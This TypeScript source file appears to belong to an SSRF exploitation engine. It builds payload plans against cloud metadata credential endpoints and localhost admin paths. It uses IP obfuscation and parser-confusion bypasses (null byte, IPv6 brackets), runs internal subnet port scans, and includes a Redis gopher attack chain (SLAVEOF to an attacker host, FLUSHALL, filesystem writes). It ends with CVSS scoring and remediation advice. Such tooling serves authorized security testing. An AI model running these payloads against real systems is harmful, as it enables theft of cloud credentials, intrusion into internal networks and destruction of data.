import { generateInternalServiceTargets } from "./payloads/internal-services.ts";
import { generateCloudMetadataTargets } from "./payloads/cloud-metadata.ts";
import {
  generateParserConfusionPayloads,
  generateFullwidthIpPayloads,
  generateIdnaPayloads,
  generateSniInjectionPayloads
} from "./bypasses/parser-confusion.ts";
import { generateProtocolSmugglingPayloads, generateRedisAttackPayloads } from "./bypasses/protocols.ts";
import { generateIpObfuscations } from "./bypasses/ip-obfuscation.ts";
import { generateHeaderInjectionPayloads } from "./bypasses/header-injection.ts";
import { CanaryRegistry } from "./canary.ts";

export type StackName = "PHP" | "Python" | "Node.js" | "Java" | "Ruby" | ".NET" | "Go" | "unknown";

export function detectStack(headers: Record<string, string> = {}, body = ""): StackName {
  const normHeaders: Record<string, string> = {};
  for (const k of Object.keys(headers)) {
    const val = headers[k];
    if (typeof val === "string") {
      normHeaders[k.toLowerCase()] = val.toLowerCase();
    }
  }

  // Header check: X-Powered-By
  const xpb = normHeaders["x-powered-by"] || "";
  if (xpb.includes("php")) return "PHP";
  if (xpb.includes("python")) return "Python";
  if (xpb.includes("express") || xpb.includes("node")) return "Node.js";
  if (xpb.includes("servlet") || xpb.includes("java")) return "Java";
  if (xpb.includes("ruby") || xpb.includes("rails")) return "Ruby";
  if (xpb.includes("asp.net") || xpb === ".net" || xpb.includes("dotnet")) return ".NET";
  if (xpb.includes("go")) return "Go";

  // Header check: Server
  const server = normHeaders["server"] || "";
  if (/gunicorn|werkzeug|uvicorn/i.test(server)) return "Python";
  if (/webrick|passenger/i.test(server)) return "Ruby";
  if (/apache-coyote/i.test(server)) return "Java";
  if (/kestrel|microsoft-iis/i.test(server)) return ".NET";
  if (/^go$/i.test(server)) return "Go";

  // Header check: Cookie
  const cookie = normHeaders["set-cookie"] || "";
  if (cookie.includes("phpsessid")) return "PHP";
  if (cookie.includes("connect.sid")) return "Node.js";
  if (cookie.includes("jsessionid")) return "Java";
  if (cookie.includes("_rails_session") || cookie.includes("_session_id")) return "Ruby";
  if (cookie.includes("asp.net_sessionid")) return ".NET";

  // Body content check
  if (/fatal error:|allowed memory size exhausted/i.test(body)) return "PHP";
  if (/traceback \(most recent call|line \d+, in <module>/i.test(body)) return "Python";
  if (/at\s+\w+\s+\(node:http|at Server\.connectionListener|connect.sid/i.test(body)) return "Node.js";
  if (/exception in thread|java\.lang\.\w+exception/i.test(body)) return "Java";
  if (/nomethoderror:|undefined method .* for nil:nilclass/i.test(body)) return "Ruby";
  if (/server error in .* application|asp\.net/i.test(body)) return ".NET";
  if (/panic: runtime error:|goroutine \d+/i.test(body)) return "Go";

  // Check header keys for signature
  for (const k of Object.keys(headers)) {
    if (k.toLowerCase().includes("php")) return "PHP";
    if (k.toLowerCase().includes("asp.net")) return ".NET";
  }

  return "unknown";
}

/**
 * Stack-specific bypass ordering priorities.
 *
 * Mirrors the competitor Mermaid "Stack-Specific Bypass Ordering" diagram:
 *   PHP  → fragment, authority, null byte
 *   Python → backslash, Unicode, fragment
 *   Node.js → Unicode fullwidth, protocol-relative, CRLF
 *   Java → IPv6 brackets, fragment, authority
 *   Ruby → open-uri redirect, Unicode, fragment
 *   .NET → Unicode, IPv6 brackets, authority
 *   Go → fragment, Unicode, authority
 *
 * Technique names map onto generators in parser-confusion.ts. "null byte injection"
 * and "IPv6 brackets" are first-class plan categories added below when stack matches.
 *
 * @see https://labs.trace37.com/blog/enigma-ssrf-engine/ "Stack-Specific Bypass Ordering"
 */
const STACK_PRIORITIES: Record<Exclude<StackName, "unknown">, string[]> = {
  PHP: ["fragment confusion", "authority confusion", "null byte injection"],
  Python: ["backslash confusion", "Unicode normalization", "fragment confusion"],
  "Node.js": ["Unicode normalization", "scheme confusion", "CRLF injection"],
  Java: ["IPv6 brackets", "fragment confusion", "authority confusion"],
  Ruby: ["open redirect chaining", "Unicode normalization", "fragment confusion"],
  ".NET": ["Unicode normalization", "IPv6 brackets", "authority confusion"],
  Go: ["fragment confusion", "Unicode normalization", "authority confusion"]
};

const DEFAULT_PRIORITY = [
  "authority confusion",
  "fragment confusion",
  "backslash confusion",
  "CRLF injection",
  "Unicode normalization",
  "allowlist bypass",
  "open redirect chaining",
  "scheme confusion",
  "null byte injection",
  "IPv6 brackets"
];

export type SsrfPayloadCategory =
  | "localhost admin"
  | "cloud metadata"
  | "internal service"
  | "parser confusion"
  | "protocol smuggling"
  | "redis attack"
  | "canary"
  | "header injection"
  | "network scan"
  | "xmlrpc pingback";

export interface SsrfPayload {
  category: SsrfPayloadCategory;
  payload: string;
  technique?: string;
  detail?: string;
  headers?: Record<string, string>;
  /**
   * XML-RPC pingback items are POSTed to a fixed endpoint with an XML body
   * instead of being injected as a query parameter.
   */
  method?: "GET" | "POST";
  requestUrl?: string;
  body?: string;
}

export interface SsrfPayloadPlanOptions {
  targetUrl: string;
  allowedHost?: string;
  headers?: Record<string, string>;
  body?: string;
  canaryUrl?: string;
  /**
   * When set, the canary branch emits interactsh payloads from this factory
   * (stable correlation-id middle label) instead of minting fresh
   * CanaryRegistry UUIDs — which break server-side correlation.
   */
  oobPayload?: () => string;
  /** When true, include header-injection SSRF vectors (X-Forwarded-*, Referer, etc.). */
  testHeaders?: boolean;
  /**
   * Optional internal subnet for Phase-2 network scan (cartesian host × port product).
   * Example: "10.0.0.0/24" — only the first 16 host addresses are expanded by default.
   */
  subnet?: string;
  /**
   * Redis attack chain options. When provided, generates gopher-based
   * Redis exploitation payloads (INFO recon + SLAVEOF/FLUSHALL + optional
   * filesystem writes from caller-supplied content).
   */
  redisAttack?: {
    attackerHost: string;
    attackerPort: number;
    redisHost?: string;
    redisPort?: number;
    writes?: Array<{ dir: string; filename: string; content: string; key?: string }>;
  };
}

/** Critical IPs that should be expanded with obfuscation variants. */
const OBFUSCATABLE_IPS = new Set([
  "127.0.0.1",
  "169.254.169.254",
  "100.100.100.200"
]);

/** High-value cloud/admin paths to cross with IP obfuscation (keeps plan bounded). */
const CRITICAL_CLOUD_PATHS = new Set([
  "/latest/meta-data/",
  "/latest/meta-data/iam/security-credentials/",
  "/computeMetadata/v1/instance/service-accounts/default/token",
  "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
  "/latest/meta-data/ram/security-credentials/",
  "/opc/v2/instance/"
]);

const NETWORK_SCAN_PORTS = [80, 443, 22, 3306, 5432, 6379, 8080, 8443, 9200, 27017];

/**
 * Expand a simple /24 (or host-count-limited) subnet into host addresses for
 * SSRF-driven internal network scanning — competitor Phase 2 "Network Scan".
 */
export function expandSubnetHosts(subnet: string, maxHosts = 16): string[] {
  const m = subnet.trim().match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)(?:\/(\d+))?$/);
  if (!m) return [];
  const a = parseInt(m[1], 10);
  const b = parseInt(m[2], 10);
  const c = parseInt(m[3], 10);
  const d = parseInt(m[4], 10);
  const prefix = m[5] ? parseInt(m[5], 10) : 32;
  if ([a, b, c, d].some((n) => n > 255) || prefix < 0 || prefix > 32) return [];

  if (prefix >= 32) return [`${a}.${b}.${c}.${d}`];

  const hosts: string[] = [];
  const hostBits = 32 - prefix;
  const max = Math.min(maxHosts, Math.max(1, (1 << Math.min(hostBits, 8)) - 2));

  let current = (a << 24) + (b << 16) + (c << 8) + d;
  for (let i = 1; i <= max; i++) {
    current++;
    const newA = (current >>> 24) & 0xff;
    const newB = (current >>> 16) & 0xff;
    const newC = (current >>> 8) & 0xff;
    const newD = current & 0xff;
    hosts.push(`${newA}.${newB}.${newC}.${newD}`);
  }
  return hosts;
}

export function generateSsrfPayloadPlan(options: SsrfPayloadPlanOptions): SsrfPayload[] {
  const plan: SsrfPayload[] = [];
  const stack = detectStack(options.headers || {}, options.body || "");
  const allowedHost = options.allowedHost || "localhost";

  // 1. localhost admin (highest hit rate — many apps trust localhost)
  const internalTargets = generateInternalServiceTargets();
  const adminTarget = internalTargets.find(t => t.service === "localhost admin paths");
  if (adminTarget) {
    for (const path of adminTarget.paths) {
      plan.push({
        category: "localhost admin",
        payload: `http://localhost${path}`,
        detail: `Localhost admin path targeting ${path}`
      });
      plan.push({
        category: "localhost admin",
        payload: `http://127.0.0.1${path}`,
        detail: `Localhost admin path targeting ${path}`
      });
    }

    // Cross a few high-value admin paths with IP obfuscation / DNS aliases
    const topAdminPaths = adminTarget.paths.slice(0, 6);
    const loopbackObf = generateIpObfuscations("127.0.0.1");
    for (const path of topAdminPaths) {
      for (const obf of loopbackObf) {
        // Skip raw 127.0.0.1 / localhost already covered above
        if (obf.host === "127.0.0.1" || obf.host === "localhost") continue;
        const host = obf.host.includes(":") && !obf.host.startsWith("[") ? `[${obf.host}]` : obf.host;
        plan.push({
          category: "localhost admin",
          payload: `http://${host}${path}`,
          technique: obf.technique,
          detail: `Localhost admin via ${obf.technique}: ${path}`
        });
      }
    }
  }

  // 2. cloud metadata + IP obfuscation (cartesian of critical paths × host forms)
  const cloudTargets = generateCloudMetadataTargets();
  for (const t of cloudTargets) {
    for (const path of t.paths) {
      const basePayload: SsrfPayload = {
        category: "cloud metadata",
        payload: t.endpoint.includes(":") && !t.endpoint.startsWith("[") && !t.endpoint.includes(".")
          ? `http://[${t.endpoint}]${path}`
          : `http://${t.endpoint}${path}`,
        detail: `Cloud metadata targeting ${t.provider}`,
        headers: t.requiredHeaders
      };
      plan.push(basePayload);

      // Obfuscation variants for dotted-decimal metadata IPs on critical paths
      if (OBFUSCATABLE_IPS.has(t.endpoint) && CRITICAL_CLOUD_PATHS.has(path)) {
        for (const obf of generateIpObfuscations(t.endpoint)) {
          if (obf.host === t.endpoint) continue;
          const host = obf.host.includes(":") && !obf.host.startsWith("[") ? `[${obf.host}]` : obf.host;
          plan.push({
            category: "cloud metadata",
            payload: `http://${host}${path}`,
            technique: obf.technique,
            detail: `Cloud metadata ${t.provider} via ${obf.technique}`,
            headers: t.requiredHeaders
          });
        }
        // Fullwidth / circled digit Unicode forms (Orange Tsai + Node.js stack priority)
        for (const fw of generateFullwidthIpPayloads(t.endpoint)) {
          // generateFullwidthIpPayloads returns full http://.../ URLs; re-path them
          const hostPart = fw.payload.replace(/^https?:\/\//, "").replace(/\/$/, "");
          plan.push({
            category: "cloud metadata",
            payload: `http://${hostPart}${path}`,
            technique: fw.technique,
            detail: `Cloud metadata ${t.provider} via ${fw.technique}`,
            headers: t.requiredHeaders
          });
        }
      }
    }
  }

  // 3. internal service fingerprinting
  for (const t of internalTargets) {
    if (t.service === "localhost admin paths") continue;
    // Skip pure TCP services that have no HTTP probe surface
    if ((t as { tcpOnly?: boolean }).tcpOnly || t.paths.length === 0) continue;
    for (const path of t.paths) {
      plan.push({
        category: "internal service",
        payload: `http://127.0.0.1:${t.port}${path}`,
        detail: `Internal service ${t.service} fingerprinting`
      });
    }
  }

  // 3b. Network scan (optional subnet × critical ports cartesian product)
  if (options.subnet) {
    for (const host of expandSubnetHosts(options.subnet)) {
      for (const port of NETWORK_SCAN_PORTS) {
        plan.push({
          category: "network scan",
          payload: `http://${host}:${port}/`,
          technique: "subnet port scan",
          detail: `Internal network scan ${host}:${port}`
        });
      }
    }
  }

  // 4. parser confusion (stack-prioritized)
  const internalTargetForBypass =
    options.targetUrl.includes("169.254") || options.targetUrl.includes("127.0.0.1")
      ? options.targetUrl
      : "http://169.254.169.254/latest/meta-data/";

  const parserConfusionPayloads = generateParserConfusionPayloads(
    internalTargetForBypass,
    allowedHost
  );

  // Stack-specific first-class techniques not produced by the base generator
  if (stack === "PHP" || stack === "unknown") {
    parserConfusionPayloads.push({
      technique: "null byte injection",
      payload: `http://${allowedHost}%00@169.254.169.254/latest/meta-data/`
    });
  }
  if (stack === "Java" || stack === ".NET" || stack === "unknown") {
    parserConfusionPayloads.push({
      technique: "IPv6 brackets",
      payload: `http://[::ffff:169.254.169.254]/latest/meta-data/`
    });
    parserConfusionPayloads.push({
      technique: "IPv6 brackets",
      payload: `http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/`
    });
  }

  // IDNA / SNI generators (Orange Tsai advanced branches)
  for (const p of generateIdnaPayloads(allowedHost)) {
    parserConfusionPayloads.push(p);
  }
  for (const p of generateSniInjectionPayloads("127.0.0.1", 443)) {
    parserConfusionPayloads.push({ technique: p.technique, payload: p.payload });
  }

  const priorityList = stack !== "unknown" ? STACK_PRIORITIES[stack] : DEFAULT_PRIORITY;
  const fullOrder = [...priorityList];
  for (const tech of DEFAULT_PRIORITY) {
    if (!fullOrder.includes(tech)) fullOrder.push(tech);
  }
  // Ensure stack-only techniques appear even if not in DEFAULT_PRIORITY
  for (const tech of ["null byte injection", "IPv6 brackets", "IDNA case-folding"]) {
    if (!fullOrder.includes(tech)) fullOrder.push(tech);
  }

  const parserConfusionMap = new Map<string, typeof parserConfusionPayloads>();
  for (const p of parserConfusionPayloads) {
    const list = parserConfusionMap.get(p.technique) || [];
    list.push(p);
    parserConfusionMap.set(p.technique, list);
  }

  for (const tech of fullOrder) {
    const list = parserConfusionMap.get(tech) || [];
    for (const item of list) {
      plan.push({
        category: "parser confusion",
        payload: item.payload,
        technique: tech,
        detail: `Parser confusion bypass targeting ${tech}`
      });
    }
  }
  // Any remaining techniques not in fullOrder
  for (const [tech, list] of parserConfusionMap) {
    if (fullOrder.includes(tech)) continue;
    for (const item of list) {
      plan.push({
        category: "parser confusion",
        payload: item.payload,
        technique: tech,
        detail: `Parser confusion bypass targeting ${tech}`
      });
    }
  }

  // 5. protocol smuggling
  let targetHost = "127.0.0.1";
  try {
    const url = new URL(options.targetUrl);
    targetHost = url.hostname;
  } catch {
    if (options.targetUrl.includes("://")) {
      const parts = options.targetUrl.split("://")[1].split("/")[0].split(":")[0];
      if (parts) targetHost = parts;
    } else {
      const parts = options.targetUrl.split("/")[0].split(":")[0];
      if (parts) targetHost = parts;
    }
  }

  const smugglingPayloads = generateProtocolSmugglingPayloads(targetHost);
  for (const p of smugglingPayloads) {
    plan.push({
      category: "protocol smuggling",
      payload: p.payload,
      technique: p.protocol,
      detail: p.detail
    });
  }

  // 6. redis attack chain
  if (options.redisAttack) {
    const redisPayloads = generateRedisAttackPayloads(options.redisAttack);
    for (const p of redisPayloads) {
      plan.push({
        category: "redis attack",
        payload: p.payload,
        technique: p.technique,
        detail: `Redis ${p.technique}${p.dangerous ? " (dangerous)" : ""}`
      });
    }
  }

  // 7. header injection vectors
  if (options.testHeaders) {
    let canaryDomain: string | undefined;
    if (options.canaryUrl) {
      try {
        canaryDomain = options.canaryUrl.includes("://")
          ? new URL(options.canaryUrl).hostname
          : options.canaryUrl;
      } catch {
        canaryDomain = options.canaryUrl;
      }
    }
    for (const h of generateHeaderInjectionPayloads("169.254.169.254", canaryDomain)) {
      plan.push({
        category: "header injection",
        payload: h.value,
        technique: h.header,
        detail: h.technique,
        headers: { [h.header]: h.value }
      });
    }
  }

  // 8. canary (OOB confirmation)
  if (options.canaryUrl) {
    // interactsh path: payloads come from the registered correlation-id so
    // poll /interactions can attribute callbacks to this session.
    if (options.oobPayload) {
      plan.push({
        category: "canary",
        payload: options.oobPayload(),
        technique: "interactsh",
        detail: "Out-of-band interactsh HTTP canary payload"
      });
    } else {
      let domain = options.canaryUrl;
      try {
        if (domain.includes("://")) {
          const url = new URL(domain);
          domain = url.hostname;
        }
      } catch {}

      const registry = new CanaryRegistry();
      const token = registry.register({
        target: options.targetUrl,
        parameter: "url",
        payload: "PLACEHOLDER",
        technique: "canary"
      }, domain);

      const record = registry.get(token);
      if (record) {
        plan.push({
          category: "canary",
          payload: record.callbacks.directHttp,
          technique: "directHttp",
          detail: "Out-of-band HTTP canary payload"
        });
        plan.push({
          category: "canary",
          payload: record.callbacks.dnsOnly,
          technique: "dnsOnly",
          detail: "Out-of-band DNS canary payload"
        });
        plan.push({
          category: "canary",
          payload: record.callbacks.pathIdentified,
          technique: "pathIdentified",
          detail: "Out-of-band path identified canary payload"
        });
        plan.push({
          category: "canary",
          payload: record.callbacks.redirectChain,
          technique: "redirectChain",
          detail: "Out-of-band redirect chain canary payload"
        });
      }
    }
  }

  return plan;
}

export interface CvssScore {
  base: number;
  severity: "critical" | "high" | "medium" | "low";
  vector: string;
}

export interface ImpactAssessment {
  cvss: CvssScore;
  attackPath: string;
  recommendations: string[];
  confidence: "high" | "medium" | "low";
}

/**
 * CVSS-based impact assessment with attack-path and remediation guidance.
 *
 * Base scores bracket the competitor's published values (see "Impact Assessment"
 * diagram at https://labs.trace37.com/blog/enigma-ssrf-engine/ ); applied boost
 * logic (confirmed +0.5, +0.3 per high-confidence content match, technique
 * multipliers for open-redirect/CRLF/gopher/dict) reconciles our final score to
 * the blog's classified targets:
 *
 *   Cloud + credentials → CRITICAL 9.8   (our 9.0 + confirms + content matches)
 *   Internal services + creds → CRITICAL 9.1  (our 8.8 + confirms)
 *   Cloud metadata → HIGH 8.6             (our 9.0 unconfirmed or 7.5 internal)
 *   Internal services → HIGH 7.5          (our 7.5 baseline)
 *   Response visible + internal → MEDIUM 6.5  (our 6.5 parser confusion)
 *   DNS exfil only → LOW 4.3              (default 5.0 path)
 *
 * @see https://labs.trace37.com/blog/enigma-ssrf-engine/ "Impact Assessment"
 */
export function assessImpact(
  category: string,
  technique: string,
  confirmed: boolean,
  contentMatches?: Array<{ pattern: string; category: string; confidence: string }>
): ImpactAssessment {
  let base = 0;
  let vectorParts: string[] = [];

  // Base score by category
  switch (category) {
    case "cloud metadata":
      base = 9.0;
      vectorParts.push("AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N");
      break;
    case "redis attack":
      base = 8.8;
      vectorParts.push("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
      break;
    case "internal service":
      base = 7.5;
      vectorParts.push("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
      break;
    case "localhost admin":
      base = 7.0;
      vectorParts.push("AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N");
      break;
    case "parser confusion":
      base = 6.5;
      vectorParts.push("AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N");
      break;
    case "protocol smuggling":
      base = 8.1;
      vectorParts.push("AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N");
      break;
    default:
      base = 5.0;
      vectorParts.push("AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N");
  }

  // Technique multipliers
  if (technique.includes("open redirect")) base += 0.5;
  if (technique.includes("CRLF")) base += 0.3;
  if (technique.includes("gopher")) base += 0.4;
  if (technique.includes("dict")) base += 0.3;

  // Confirmation boost
  if (confirmed) base += 0.5;

  // Content match adjustments
  if (contentMatches) {
    const highMatches = contentMatches.filter(m => m.confidence === "high");
    const medMatches = contentMatches.filter(m => m.confidence === "medium");
    base += highMatches.length * 0.3;
    base += medMatches.length * 0.1;
  }

  base = Math.min(10, Math.max(0, base));

  let severity: "critical" | "high" | "medium" | "low";
  if (base >= 9.0) severity = "critical";
  else if (base >= 7.0) severity = "high";
  else if (base >= 4.0) severity = "medium";
  else severity = "low";

  const attackPath = generateAttackPath(category, technique, confirmed, contentMatches);
  const recommendations = generateRecommendations(category, technique, severity);

  const confidence = confirmed ? "high" : (contentMatches && contentMatches.length > 0 ? "medium" : "low");

  return {
    cvss: { base, severity, vector: vectorParts.join("/") },
    attackPath,
    recommendations,
    confidence
  };
}

function generateAttackPath(
  category: string,
  technique: string,
  confirmed: boolean,
  contentMatches?: Array<{ pattern: string; category: string }>
): string {
  const steps: string[] = [];

  steps.push(`Identify SSRF-vulnerable parameter via ${technique}`);

  if (category === "cloud metadata") {
    steps.push("Access cloud metadata endpoint (169.254.169.254)");
    if (confirmed && contentMatches) {
      const hasCredentials = contentMatches.some(m => m.category === "credential");
      if (hasCredentials) {
        steps.push("Extract cloud credentials from metadata response");
        steps.push("Use credentials to access cloud services");
      }
    }
  } else if (category === "redis attack") {
    steps.push("Send gopher payload to Redis service");
    if (confirmed) {
      steps.push("Execute Redis commands (INFO, SLAVEOF, FLUSHALL)");
      steps.push("Write attacker-controlled content to filesystem");
    }
  } else if (category === "internal service") {
    steps.push("Access internal service endpoint");
    if (confirmed) {
      steps.push("Enumerate service configuration");
      steps.push("Extract sensitive data or credentials");
    }
  } else if (category === "localhost admin") {
    steps.push("Access localhost admin panel");
    if (confirmed) {
      steps.push("Exploit admin functionality for RCE");
    }
  } else if (category === "protocol smuggling") {
    steps.push("Smuggle payload via file/gopher/dict protocol");
    if (confirmed) {
      steps.push("Read sensitive files or interact with internal services");
    }
  }

  return steps.join(" → ");
}

function generateRecommendations(
  category: string,
  technique: string,
  severity: "critical" | "high" | "medium" | "low"
): string[] {
  const recs: string[] = [];

  if (severity === "critical" || severity === "high") {
    recs.push("URGENT: Remediate SSRF vulnerability immediately");
  }

  recs.push("Implement URL validation with allowlist approach");
  recs.push("Block internal IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16)");

  if (category === "cloud metadata") {
    recs.push("Implement IMDSv2 (AWS) or disable metadata endpoint");
    recs.push("Use cloud provider metadata protection features");
  }

  if (category === "redis attack" || technique.includes("gopher")) {
    recs.push("Disable dangerous Redis commands (SLAVEOF, FLUSHALL, CONFIG)");
    recs.push("Require authentication for Redis service");
    recs.push("Bind Redis to localhost only");
  }

  if (technique.includes("file://")) {
    recs.push("Block file:// protocol in user input");
    recs.push("Restrict file system access via chroot or containerization");
  }

  if (technique.includes("CRLF") || technique.includes("header injection")) {
    recs.push("Sanitize CRLF characters from user input");
    recs.push("Validate and encode HTTP headers");
  }

  if (technique.includes("open redirect")) {
    recs.push("Implement redirect validation with destination allowlist");
  }

  recs.push("Deploy network segmentation to limit SSRF impact");
  recs.push("Enable logging and monitoring for SSRF attempts");

  return recs;
}

export type ScanPhase = "discovery" | "targeting" | "bypass" | "confirmation" | "impact" | "report";

export type ScanResult = "confirmed" | "blocked" | "no_signal";

export interface PhaseTransition {
  from: ScanPhase;
  to: ScanPhase;
  result: ScanResult;
}

export const PHASE_TRANSITIONS: ScanPhase[] = [
  "discovery",
  "targeting",
  "bypass",
  "confirmation",
  "impact",
  "report"
];

export function getNextPhase(
  currentPhase: ScanPhase,
  result: ScanResult
): ScanPhase {
  switch (currentPhase) {
    case "discovery":
      return "targeting";
    case "targeting":
      return "bypass";
    case "bypass":
      return "confirmation";
    case "confirmation":
      if (result === "confirmed") return "impact";
      if (result === "blocked") return "bypass"; // Try different bypass
      if (result === "no_signal") return "discovery"; // Back to discovery
      return "report";
    case "impact":
      return "report";
    case "report":
      return "report"; // Terminal state
    default:
      return "discovery";
  }
}

export interface ScanState {
  phase: ScanPhase;
  attempts: number;
  maxAttempts: number;
  results: ScanResult[];
  currentBypass?: string;
}

export function createScanState(maxAttempts = 100): ScanState {
  return {
    phase: "discovery",
    attempts: 0,
    maxAttempts,
    results: []
  };
}

export function advanceScanState(
  state: ScanState,
  result: ScanResult
): { state: ScanState; shouldContinue: boolean } {
  const nextPhase = getNextPhase(state.phase, result);

  const newState: ScanState = {
    ...state,
    phase: nextPhase,
    attempts: state.attempts + 1,
    results: [...state.results, result]
  };

  const shouldContinue = newState.attempts < newState.maxAttempts && newState.phase !== "report";

  return { state: newState, shouldContinue };
}

export interface NetworkScanPayload {
  payload: string;
  port: number;
  service: string;
  technique: string;
}

export function generateNetworkScanPayloads(
  targetHost: string,
  ports: number[]
): NetworkScanPayload[] {
  const serviceMap: Record<number, string> = {
    21: "ftp",
    22: "ssh",
    23: "telnet",
    25: "smtp",
    53: "dns",
    80: "http",
    110: "pop3",
    143: "imap",
    443: "https",
    993: "imaps",
    995: "pop3s",
    3306: "mysql",
    3389: "rdp",
    5432: "postgresql",
    6379: "redis",
    8080: "http-alt",
    8443: "https-alt",
    27017: "mongodb"
  };
  
  return ports.map(port => ({
    port,
    service: serviceMap[port] || "unknown",
    payload: port === 443 ? `https://${targetHost}:${port}` : `http://${targetHost}:${port}`,
    technique: `Network scan - ${serviceMap[port] || 'unknown'} service on port ${port}`
  }));
}
